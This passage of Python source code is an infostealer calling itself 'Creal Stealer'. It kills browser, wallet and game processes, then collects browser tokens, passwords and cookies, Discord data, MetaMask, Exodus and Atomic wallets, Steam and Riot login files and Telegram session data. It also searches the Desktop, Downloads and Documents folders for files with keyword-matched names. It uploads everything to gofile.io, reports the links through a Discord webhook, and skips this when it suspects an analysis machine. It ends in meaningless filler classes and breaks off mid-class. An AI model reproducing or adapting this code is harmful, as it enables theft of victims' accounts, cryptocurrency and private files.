        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    data = {
        "content": globalInfo(),
        "embeds": [
            {
            "title": "Creal Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 2895667,
            "footer": {
                "text": "Creal Stealer",
                "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
            }
            }
        ],
        "username": "Creal Stealer",
        "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
        "attachments": []
    }
    L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def Z1pTh1ngs(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
        a = threading.Thread(target=getT0k3n, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=G3tD1sc0rd, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getP4ssw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getC00k13, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = TR6st(C00k13)
    if DETECTED == True: return

    for patt in browserPaths:
         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]]).start()
    
    for patt in PathsToZip:
         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]]).start()
    
    threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

    for file in ["crpassw.txt", "crcook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

# def uploadToAnonfiles(path):s
#     try:
#         files = { "file": (path, open(path, mode='rb')) }
#         upload = requests.post("https://transfer.sh/", files=files)
#         url = upload.text
#         return url
#     except:
#         return False

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret",
        "senhas",
        "contas",
        "backup",
        "2fa",
        "importante",
        "privado",
        "exodus",
        "exposed",
        "perder",
        "amigos",
        "empresa",
        "trabalho",
        "work",
        "private",
        "source",
        "users",
        "username",
        "login",
        "user",
        "usuario",
        "log"
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",                                                          
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "mom",
        "family"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, P4sswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

CookiCount, P4sswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = [] # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = TR6st(C00k13)
# DETECTED = False
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)

class IhGlveKXgTqy:
    def __init__(self):
        self.__jYSZArZj()
        self.__EeOLOaPldW()
        self.__fGLXJgphrastU()
        self.__xpdgFNTgd()
        self.__fZOgNrGMjaJqWSaVy()
        self.__CUYUqOoo()
        self.__YDQoUVOnMK()
        self.__sCfXRtQfOIobTORHM()
        self.__rsYalBouKtDqmuekuT()
        self.__DBUpjZABOd()
    def __jYSZArZj(self, aFLYWEEVgWCtrnIpV):
        return self.__sCfXRtQfOIobTORHM()
    def __EeOLOaPldW(self, HbLbhWgot):
        return self.__rsYalBouKtDqmuekuT()
    def __fGLXJgphrastU(self, eNFSrej, oTCljayeFyocpdYOp, njsRjwDAZ):
        return self.__fZOgNrGMjaJqWSaVy()
    def __xpdgFNTgd(self, jNUaGejoTIxQWf, eKpSOlst, siWhJHGuNcD, acQcKKQUoVCWdFXai, xOrNkhYik):
        return self.__EeOLOaPldW()
    def __fZOgNrGMjaJqWSaVy(self, qlwSyO, eLWfOybXtCJZrEFjPJU, qoHsQYHSZXHSuMSkEl, lzkYCsnTbcTJ, fJGErIweaBFvHSiIkpBF):
        return self.__jYSZArZj()
    def __CUYUqOoo(self, aaHMQ, TMYHaPVpvcyFPwu, TTzvsMNqWknwQQMiaZFs, CtKGLGNuSMKltYH):
        return self.__fZOgNrGMjaJqWSaVy()
    def __YDQoUVOnMK(self, xHDoIJhOPoLXUNnnS, eoQqjomvgUac, lwKLASQLwHrYC, MVrOrUgMsEq, onfPcgebJzbsfiboaO, XPgBzednZO):
        return self.__YDQoUVOnMK()
    def __sCfXRtQfOIobTORHM(self, EVBuGWz, JtuRMESNPbGfpneA, BLNFE, MpDeOlzzJjHccn, fKFvigcnppTRdAEp):
        return self.__xpdgFNTgd()
    def __rsYalBouKtDqmuekuT(self, JqpZhAQ, PLwoefvms, JeHvthnMD, tpCSS):
        return self.__EeOLOaPldW()
    def __DBUpjZABOd(self, LwYMahrXMicAwVCv, FbRhMccpESvAcXcZlf):
        return self.__rsYalBouKtDqmuekuT()
class MysjoKOOkGUWykW:
    def __init__(self):
        self.__LtPoemSKXwU()
        self.__ogZzMJQFxosIVrAJwPKb()
        self.__NTAAJAGMvh()
        self.__nANsRaFBLvnTTeG()
        self.__RaDyameukyzwRR()
        self.__ySxeBQAND()
        self.__sVybTqciMkeaCsxg()
        self.__xXCHlNrwGgawMPu()
        self.__ejfhprDLDN()
        self.__SxoJlwSEConumBlRMmC()
        self.__UzbcfMJFHFygEUY()
        self.__ofYfUXNWxIVZxheVGfB()
    def __LtPoemSKXwU(self, GSGUyaOSMEXUiuI, eVxLyDgFEubkRkIkB, mVIgmum, YsXzsjYj):
        return self.__ejfhprDLDN()
    def __ogZzMJQFxosIVrAJwPKb(self, xWWTmxOFmibLdu, bIemzZgpRUil, GNUpUNyZNtKFEguQ, cLKRYpLamzQe, fPgamO, IhGOCIgNStokHZZ, NlTZJnxKMFhyltmdit):
        return self.__ySxeBQAND()
    def __NTAAJAGMvh(self, VSUFHBvhGwqnt, GgcfgIoKEG, UrywNtChmVXmJ, YAIIUbgtHObV):
        return self.__xXCHlNrwGgawMPu()
    def __nANsRaFBLvnTTeG(self, kGYSmZUWunFnBWgiKU, RDTyhF, xpDhCvsajnujhTAm, FzqmNugy, SoUyepRpazDGeohE):
        return self.__ejfhprDLDN()
    def __RaDyameukyzwRR(self, DmgPxJaILDEtEadT, HwWnN, qYFtYHIzmuPhdhONH, vDyvXWKzVpzMPSwmMT, fQikwdPVtx):
        return self.__RaDyameukyzwRR()
    def __ySxeBQAND(self, BONrDaouR, NUXRADFYkLx, bxBOFvWcwxRtyI, EeVbeOQzAuWtydJzEnGm, jHpZuWJi):
        return self.__LtPoemSKXwU()
    def __sVybTqciMkeaCsxg(self, YIGePusaAufTd, ddWrNHeAVFH, etpEsXYrkOok, umaqpi, qqGMMlO, DuUQMhLbnwaVmctlR):
        return self.__ofYfUXNWxIVZxheVGfB()
    def __xXCHlNrwGgawMPu(self, UDVwycbOkFpbKExZWO, gUJKFoPuqEDxjDZUB, LtzPL, QkqKCkYfJw, sevntjODlGZ, BfOjIUT):
        return self.__xXCHlNrwGgawMPu()
    def __ejfhprDLDN(self, iKUZJQDNR, WchvdITMPDBzPx, mEayvKNXSgVvc, GdNEDzUYLCOL, VOheCiSL, YZjKWRAl):
        return self.__ejfhprDLDN()
    def __SxoJlwSEConumBlRMmC(self, zGpIWSprSLwjOGPd):
        return self.__LtPoemSKXwU()
    def __UzbcfMJFHFygEUY(self, CxzLC, NSXlx, jIlLNlTQ):
        return self.__sVybTqciMkeaCsxg()
    def __ofYfUXNWxIVZxheVGfB(self, BjgBzLybTGCeUeKMXJfH, RempVOp, UEGCX, eAkvl, MsLsmmLOvq, DVxdeS):
        return self.__ogZzMJQFxosIVrAJwPKb()
class bmRdqQzIFaFLQVUsFVD:
    def __init__(self):
        self.__xniRngsCaQYeVh()
        self.__HBAhWwWcy()
        self.__vGctTdShTxnUbKWGOeM()
        self.__jdKUpekgwv()
        self.__aBpcWOMkrLQrkgI()
        self.__iMwqcmkkS()
        self.__zhLDpiqeDzyZ()
        self.__ESAAUPcaGrJrwxoN()
        self.__KaoAayPTWOyHaWqIKV()
        self.__RdHRAZbVW()
        self.__BJAqfDNbPgprwXTjlmco()
        self.__FHMHffkNUa()
    def __xniRngsCaQYeVh(self, rSoJFwvhWhL, ctwXAhcXcjlzI, tzWwtbPd, EuMlnDNPDw, itWnYVJhtttf):
        return self.__vGctTdShTxnUbKWGOeM()
    def __HBAhWwWcy(self, lvAqSgUsqlp, ncAaOeP, AWWXHoLWGNSJrVRHL, kbCuvtCzPqm, ODdFulZQL, GVQusUDrqLdTqHFi, RKefhCbspaKjSH):
        return self.__RdHRAZbVW()
    def __vGctTdShTxnUbKWGOeM(self, OolUlpM, WczGFiLvHQGJIdlujjVS, hoyjC, OXpwMQNDRhQRpONbQDi, tFElaqnVwBRJbi, VqrtBtyQZTqpKTtoNr):
        return self.__FHMHffkNUa()
    def __jdKUpekgwv(self, IQroPK, huGnzXhZCFZn, ltKGhNt):
        return self.__iMwqcmkkS()
    def __aBpcWOMkrLQrkgI(self, aisTMLTp, mQWYqfTmj, VSttp):
        return self.__jdKUpekgwv()
    def __iMwqcmkkS(self, EKNoEzbBN, SSzjbP, mlXTAdQqVMkIzYwOBzIm, pbjvzSUqEPOknbpdFG, imjAXyIHPepPQcvKUYHk):
        return self.__BJAqfDNbPgprwXTjlmco()
    def __zhLDpiqeDzyZ(self, TLwezjo, vjaUwBBVtcu, ugJygvSCnzlpMbWQvk, ZeOQq, QKLHK):
        return self.__iMwqcmkkS()
    def __ESAAUPcaGrJrwxoN(self, EtqTieZJaRmjmQxshV, DmIUsFvo, fmSqnovRKJud, SXrAfgVG, mkwShfqwrKPHXqEfNLcy, pHyjMRAknsUrUxni):
        return self.__BJAqfDNbPgprwXTjlmco()
    def __KaoAayPTWOyHaWqIKV(self, ePcScOlIF, rQyYmWVRcaYdewXl, PnJWpAHOQd):
        return self.__vGctTdShTxnUbKWGOeM()
    def __RdHRAZbVW(self, WqWHVuEWyiNNFFPAvM, kUTpEHGdpxFyT, GxaNnhDFTEkT, tNnaFhGHVo, tTlIOqBuanI):
        return self.__BJAqfDNbPgprwXTjlmco()
    def __BJAqfDNbPgprwXTjlmco(self, zITVAyzDjwuxepkQOLc, OBcRcpTfOSZjalOX, QcTCRONYjJDegsHX):
        return self.__RdHRAZbVW()
    def __FHMHffkNUa(self, TpBBD, yxpYUTwJuuS, VfrZO, OEuTpU, vgsazSHvj, ZXIaqliBIw):
        return self.__BJAqfDNbPgprwXTjlmco()
class oQryJNvqwkETY:
    def __init__(self):
        self.__aPtGhKXNgidb()
        self.__DUKWRNnfScEexzrFYhGc()
        self.__mGMMjdBpazbwzgFhKTh()
        self.__VJQlVAXQ()
        self.__NPZDEMYrGFYw()
        self.__hkatSVCuSgpijnEo()
        self.__ZHypZmhqUoLJiaQQfRs()
    def __aPtGhKXNgidb(self, ilJsamoNWeFXnFSFNsoB, EEyXdxysbLcddXYChCj, lwQZIBdeYUpeGUHNhJv, mHROnVOLYzJMJk, HMSPc, eqScgIoJx, sIzCZfjUIUMhholZdy):
        return self.__VJQlVAXQ()
    def __DUKWRNnfScEexzrFYhGc(self, eJGVA, JibsMFmknZNtt, sOuTBSVZSIBr, lSxMWoSeGnKIXbSJlX):
        return self.__ZHypZmhqUoLJiaQQfRs()
    def __mGMMjdBpazbwzgFhKTh(self, HNmVmxxKAGoNR, kJlYKfxyL, aoLEioYMXope, jASwAUkv, VwkSKksBF, LIaEFqgbNAcTtfWae):
        return self.__NPZDEMYrGFYw()
    def __VJQlVAXQ(self, upsYUoKMJvkwAbyOa, YEDSwCtXslAwjxeEYFa):
        return self.__ZHypZmhqUoLJiaQQfRs()
    def __NPZDEMYrGFYw(self, XJuyH, TAdHaeEZOhNHpvznkzaO, ABxUWEJoMvH, zFYmZBKPqdcM, zwQqCetROcPGOlHarxAV):
        return self.__DUKWRNnfScEexzrFYhGc()
    def __hkatSVCuSgpijnEo(self, FEyzLWJmEHNt, DedbYwCfoACuAKMeNF, qeWxTnKWtwLtIh, SLzSncnvU, DodPmLVhWUsQujUj, gmORlhYUibPIg, mZcnZITMcnfCluDdJn):
        return self.__DUKWRNnfScEexzrFYhGc()
    def __ZHypZmhqUoLJiaQQfRs(self, grKjTkWmxDSVdg, QAqqbmdiWCvhiFAwmzB):
        return self.__VJQlVAXQ()
class baIoyTPXAPvpkvesu:
    def __init__(self):
        self.__abmKpjVyFdjtsUFuAp()
        self.__gCDFXjLwrNibhAxdii()
        self.__QMGSYsjKajS()
        self.__DhESilDnUJ()
        self.__TJYgioLkdduyyaYLciR()
        self.__pvtRPczAzveDpFoCn()
        self.__kbemZqdAsfzfDnPnua()
        self.__qMFhIUYQkb()
        self.__CBMAzSzG()
    def __abmKpjVyFdjtsUFuAp(self, lmsUWRkSYQigzOTT, NlBFqRRZ, zAfjoObGXQkY, dzGldGtktWAH, ptQFHfGUQeXLQwH, VwgHfLwUvnaRBd):
        return self.__gCDFXjLwrNibhAxdii()
    def __gCDFXjLwrNibhAxdii(self, rxeAObvWCNlpjhe):
        return self.__gCDFXjLwrNibhAxdii()
    def __QMGSYsjKajS(self, ByYkpRc, OYeMTWTXkjWpOgJWjrGn, mprpHtyw):
        return self.__CBMAzSzG()
    def __DhESilDnUJ(self, lwGvyqzkFVVXkWMv, sOffoOczXDqvP, ZbKLYYpKFrxckVg, fgLmutpTX):
        return self.__QMGSYsjKajS()
    def __TJYgioLkdduyyaYLciR(self, cefAH, CmRnHFRLljApHX):
        return self.__QMGSYsjKajS()
    def __pvtRPczAzveDpFoCn(self, ccwYjyojBIdbRnEXrEo, PVFCZrB, bDEvmQeYPE, hrGZDlvixtuPAdLS):
        return self.__CBMAzSzG()
    def __kbemZqdAsfzfDnPnua(self, wgstoeRTGSbFm, UttdFMnsFlyeoZqALW, atPDNWAxrtAhtLAoiJjX, SYJZfiCKK, wFxsowUO):
        return self.__CBMAzSzG()
    def __qMFhIUYQkb(self, OnGpQkxYwICGyxUzhDgA, YYxryRrTjwi, NQbYQvhx):
        return self.__DhESilDnUJ()
    def __CBMAzSzG(self, WvzPDCtFTPmXnodgz, qLCEFan, cyoTOMBQfCo, PtJEXdYsBngy, AuIEKjjMGA, dzRseuwl):
        return self.__TJYgioLkdduyyaYLciR()

class xCtLRzdj:
    def __init__(self):
        self.__ZWcjYTChEe()
        self.__NToqiITmaMcjWAnn()
        self.__UrrKMqUoficlFNqTs()
        self.__dDkUaByazqA()
        self.__Vzanyllvyxeyd()
        self.__qrFdfOCeizttWZM()
        self.__DfanfoKBfSwPDcRMMobO()
        self.__JBBaEqSRLCtzDb()
        self.__qwPUsBzKn()
        self.__XSsBLXFusgUTl()
        self.__iHqRlbwB()
        self.__bLKkyZtFIdcRt()
        self.__uWXaZNbZe()
        self.__cbfCAsXmofnHYwoVZm()
        self.__igSowEQCVtNdgZay()
    def __ZWcjYTChEe(self, SgKnQxOfAgwnMFx, gfzBk, ZelKwnFTIoYCNeQhuMt, SntUdXyhwNedJqP, sBWYXHMnM, ijxtIjZQFjxlvSQlpv, ubmyGIAt):
        return self.__XSsBLXFusgUTl()
    def __NToqiITmaMcjWAnn(self, pmeOcYkiwrEy, sbaoxrgRYDEfJDEZit, juxDvjMsJRxcmYtVvof, spIZtj, ZKkvLgNb, iMWDqnMDpExyvjMpDN):
        return self.__dDkUaByazqA()
    def __UrrKMqUoficlFNqTs(self, McDbOmrshgpIkTSbZ):
        return self.__Vzanyllvyxeyd()
    def __dDkUaByazqA(self, CYNpihEq):
        return self.__DfanfoKBfSwPDcRMMobO()
    def __Vzanyllvyxeyd(self, NfRAArYcSs, sXeuiLzaduxyuedmEYGS, yUytHCgxkPSpgVZU, PKeSU, XdfYnidSriboXtfd):
        return self.__dDkUaByazqA()
    def __qrFdfOCeizttWZM(self, kFItEbE, BiUFQbMY, ZkPvulLPFfuSBXZyOsa, BTMXXjEc):
        return self.__bLKkyZtFIdcRt()
    def __DfanfoKBfSwPDcRMMobO(self, kNIkDoQEGct, qHBOFpT, prmqxyqscut, OKgOXWHDfKPuCVPy, JyqgLoRboijxmNGFmDPy, iMbOTYzKYYT):
        return self.__bLKkyZtFIdcRt()
    def __JBBaEqSRLCtzDb(self, JeBssRuhT, BIAYyJaKkpp, NSOfZabjFrL):
        return self.__qrFdfOCeizttWZM()
    def __qwPUsBzKn(self, qBZIYWLE, IjIPRKBeLvPXCgRpWF, vFLfEyHaajDo, npQeQzymClLIBMzUPJ, JBKywOoe):
        return self.__ZWcjYTChEe()
    def __XSsBLXFusgUTl(self, VZAkBBSyQJhy, ujytLKcKbAiQFBZF):
        return self.__XSsBLXFusgUTl()
    def __iHqRlbwB(self, gRJultcCCQKGTUpwHOw, eTfjAbAJVVsotkjrnsk, xZGIZor, CPMeEZuLIR, krfEO):
        return self.__NToqiITmaMcjWAnn()
    def __bLKkyZtFIdcRt(self, JRQFKsy, PqFARjuvjwHjCvrsT, bbNiHBcvekuBHbsx):
        return self.__cbfCAsXmofnHYwoVZm()
    def __uWXaZNbZe(self, GxKouXFdKOKCjksOisTv, hmVpMnl, AZiJDDTNXexQjFYBb):
        return self.__DfanfoKBfSwPDcRMMobO()
    def __cbfCAsXmofnHYwoVZm(self, OizagzpKLIJ, fOFtEDkWRIxxhVxG, SQFcUUxGlqcm, vRQAaXwmyJGaVloQpt, syjPEz):
        return self.__XSsBLXFusgUTl()
    def __igSowEQCVtNdgZay(self, CRjbVlHlpOJpZOoaW, pdzYzTfocNUyA):
        return self.__NToqiITmaMcjWAnn()
class htZmcRpcVwtLXL:
    def __init__(self):
        self.__ndiBztTFOWKB()
        self.__DZvpAzDA()
        self.__HRQnGQByuxMegKu()
        self.__QWRrPgbdtbXVXOaM()
        self.__rLGlIHaVhACcloUa()
        self.__TzpZQQDgjRlhK()
        self.__otSDTkOdtODNChtEAE()
        self.__pbGlbqcYyzchqDGOc()
        self.__OHWjmdbOLTvRN()
    def __ndiBztTFOWKB(self, yTyCnoTUPMKkkJToOE, FyRsXqFjXlIP, cJNyrBNXbmiioU, WuehF):
        return self.__ndiBztTFOWKB()
    def __DZvpAzDA(self, CHihHWTxpJwdMa, lSIEwdObDUUth):
        return self.__otSDTkOdtODNChtEAE()
    def __HRQnGQByuxMegKu(self, jCXtIKGuDl, nTACfjvghZSiCiSEp, sbUFrhI, xkuHiIpJiy, okOFvnCiSxyr, wOgWUeyNIELR):
        return self.__OHWjmdbOLTvRN()
    def __QWRrPgbdtbXVXOaM(self, HkMLjM, mTPZMgVwbpQCz, PSpMWFnh, MLvcwASq, WfVwBER, JYumVbNVVXpBt, PNxUIlmBEfcAHPG):
        return self.__QWRrPgbdtbXVXOaM()
    def __rLGlIHaVhACcloUa(self, kyJSRQyzQ, LZAPghtNvwq):
        return self.__OHWjmdbOLTvRN()
    def __TzpZQQDgjRlhK(self, OonrTlIkAYkvop, DwaRFk, bEbcavPnCmnJoSRBiN, MamHMIbubQjAgG, OnTSPzgyNCEGcWtg, gCVONHZaFavQcOZew, RwXGfWRTIFh):
        return self.__otSDTkOdtODNChtEAE()
    def __otSDTkOdtODNChtEAE(self, hcFvxVd, mQCvjCDSVUOWmJiDpz, cDZHAFIqkpNtSkGBwOxe, hhUUJXdx, FJhNsrwrBj):
        return self.__otSDTkOdtODNChtEAE()
    def __pbGlbqcYyzchqDGOc(self, IlzDpbZbWjhVWCho, bzOlPXDvqFd):
        return self.__HRQnGQByuxMegKu()
    def __OHWjmdbOLTvRN(self, WnOAeeYd, YxKhnumYrtpV):
        return self.__rLGlIHaVhACcloUa()
class BZtWNVvOywnlgOnJcl:
    def __init__(self):
        self.__PXDRCVJpfFI()
        self.__BgoAacKEsyIfK()
        self.__TYlCkkmDzF()
        self.__viJumlbvP()
        self.__UyJJWPVqTGFYzezxYjaT()
        self.__eHtjheiFdbhzsY()
        self.__TYawcwjBCNEDtZM()
        self.__BFPopdbLZiu()
        self.__WryZkNDOFYnKDblWAg()
    def __PXDRCVJpfFI(self, hjIBNcXvB, VOSGReLOMhTjxIyrbHUq, VIAmU, vWASkfSByBIeNy):
        return self.__BgoAacKEsyIfK()
    def __BgoAacKEsyIfK(self, ptBtJ, VtjxkCY, kCDmUdKRsiTM):
        return self.__PXDRCVJpfFI()
    def __TYlCkkmDzF(self, GpaMnBxjBDZVyU, KTlziBLzeDxNrSke, PcVERnX):
        return self.__UyJJWPVqTGFYzezxYjaT()
    def __viJumlbvP(self, kuZaaCWwFCPPdQ, NQTUQsBotvPfsjksSEJ):
        return self.__viJumlbvP()
    def __UyJJWPVqTGFYzezxYjaT(self, JMMubk, fNSxiq, uHgELtkVgrMxNj, tIlEPGC, rBTmqFwZsQOgDHm):
        return self.__WryZkNDOFYnKDblWAg()
    def __eHtjheiFdbhzsY(self, nDYCxmNdxoXv, wolsg, vUpMGFli, BCPNadNdnHXjwOY, IlAFmdYrZPspRaDMrTfW, CrDkPaMrvsMok):
        return self.__viJumlbvP()
    def __TYawcwjBCNEDtZM(self, GPgnSxdOZufOA, YIgpatZb):
        return self.__eHtjheiFdbhzsY()
    def __BFPopdbLZiu(self, zDGUfkXZHU, KQxHWuTRiFYEOryo):
        return self.__PXDRCVJpfFI()
    def __WryZkNDOFYnKDblWAg(self, KvYfbCfrYmONEpCEC, aydNLX, UbVolCKzFxvuIXK, obYYlQzYMTyNxCyrOi, FDvpqG):
        return self.__UyJJWPVqTGFYzezxYjaT()

class eEmogaPObxGgOHCQ:
    def __init__(self):
        self.__LjQChjSLpMhXg()
        self.__KnKBaeDlrx()
        self.__IghJcZjTTWBzNFXcDfp()
